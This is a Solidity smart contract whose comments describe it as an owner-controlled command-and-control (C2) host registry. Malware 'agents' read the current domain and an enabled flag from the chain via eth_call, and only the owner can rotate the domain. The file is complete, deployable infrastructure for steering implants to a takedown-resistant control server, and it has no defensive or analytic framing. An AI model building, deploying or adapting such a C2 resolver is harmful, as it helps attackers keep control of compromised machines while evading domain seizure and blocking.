// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title DomainRegistry
/// @notice Owner-controlled C2 host registry. Stores a hostname only (no scheme,
///         path, port or token). Agents read `domain`/`enabled` via eth_call.
contract DomainRegistry {
    address public owner;
    string public domain;
    bool public enabled;
    uint256 public version;
    uint256 public updatedAt;

    event DomainUpdated(string domain, bool enabled, uint256 version, uint256 updatedAt);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(string memory initialDomain, bool initialEnabled) {
        require(_isValidHost(initialDomain), "invalid host");
        owner = msg.sender;
        domain = initialDomain;
        enabled = initialEnabled;
        version = 1;
        updatedAt = block.timestamp;
        emit DomainUpdated(initialDomain, initialEnabled, 1, block.timestamp);
    }

    function setDomain(string calldata newDomain) external onlyOwner {
        require(_isValidHost(newDomain), "invalid host");
        domain = newDomain;
        version += 1;
        updatedAt = block.timestamp;
        emit DomainUpdated(newDomain, enabled, version, updatedAt);
    }

    function setEnabled(bool newEnabled) external onlyOwner {
        enabled = newEnabled;
        version += 1;
        updatedAt = block.timestamp;
        emit DomainUpdated(domain, newEnabled, version, updatedAt);
    }

    function setConfig(string calldata newDomain, bool newEnabled) external onlyOwner {
        require(_isValidHost(newDomain), "invalid host");
        domain = newDomain;
        enabled = newEnabled;
        version += 1;
        updatedAt = block.timestamp;
        emit DomainUpdated(newDomain, newEnabled, version, updatedAt);
    }

    function getConfig() external view returns (string memory, bool, uint256, uint256) {
        return (domain, enabled, version, updatedAt);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "zero owner");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    /// Host-only validation: printable ASCII, no scheme/path/port/space,
    /// no leading/trailing dot or hyphen, max 253 bytes.
    function _isValidHost(string memory host) internal pure returns (bool) {
        bytes memory b = bytes(host);
        if (b.length == 0 || b.length > 253) return false;
        if (b[0] == bytes1(0x2e) || b[b.length - 1] == bytes1(0x2e)) return false;
        if (b[0] == bytes1(0x2d) || b[b.length - 1] == bytes1(0x2d)) return false;

        for (uint256 i = 0; i < b.length; i++) {
            uint8 c = uint8(b[i]);
            if (c < 0x21 || c > 0x7e) return false;
            if (c == 0x2f || c == 0x3a || c == 0x5c) return false; // / : \
            if (c == 0x20 || c == 0x09 || c == 0x0a || c == 0x0d) return false;
        }
        return true;
    }
}
